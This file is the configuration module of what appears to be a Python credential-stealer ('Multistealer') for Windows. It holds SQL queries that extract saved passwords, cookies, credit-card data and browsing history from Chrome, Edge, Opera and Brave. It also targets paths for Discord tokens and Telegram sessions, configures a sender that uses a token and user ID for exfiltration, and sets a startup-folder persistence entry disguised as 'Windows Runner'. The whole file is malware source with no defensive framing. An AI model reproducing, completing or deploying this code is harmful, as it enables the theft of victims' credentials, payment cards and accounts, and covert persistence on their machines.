from os import environ
from dataclasses import dataclass

from win32api import GetUserName


user = GetUserName()


@dataclass
class ChromiumConfig:

    Variables: tuple = ("browser_name", "storage_path", "state_path", "browser_path", "statuses", "errors")
    PasswordsSQL: str = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL: str = "SELECT * FROM cookies"
    CardsSQL: str = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL: str = "SELECT url FROM visits"
    HistoryLinksSQL: str = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"


@dataclass
class MultistealerConfig:

    ZipName: str = f"{user}-st"
    StoragePath: str = rf"{environ['USERPROFILE']}\AppData\stink"

    Functions: tuple = ("system", "screen", "cookies", "passwords", "history", "processes", "cards", "discord", "telegram")

    ChromePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data",
    )

    OperaGXPaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable",
    )

    OperaDefaultPaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Local State",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable",
    )

    MicrosoftEdgePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data",
    )

    BravePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
    )


@dataclass
class SystemConfig:

    User: str = user
    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
    IPUrl: str = "https://api.ipify.org/"


@dataclass
class SenderConfig:

    Variables: tuple = ("zip_name", "storage_path", "token", "user_id", "errors")
    UserAgent: str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


@dataclass
class AutostartConfig:

    ExecutorPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows"
    AutostartName: str = "Windows Runner"
    AutostartPath: str = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    Variables: tuple = ("executor_path", "statuses", "errors")


@dataclass
class DiscordConfig:

    TokensPath: str = rf"C:\Users\{user}\AppData\Roaming\Discord\Local Storage\leveldb"
    Variables: tuple = ("storage_path", "folder", "statuses", "errors")


@dataclass
class TelegramConfig:

    SessionsPath: str = rf"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"
    Variables: tuple = ("storage_path", "folder", "statuses", "errors")
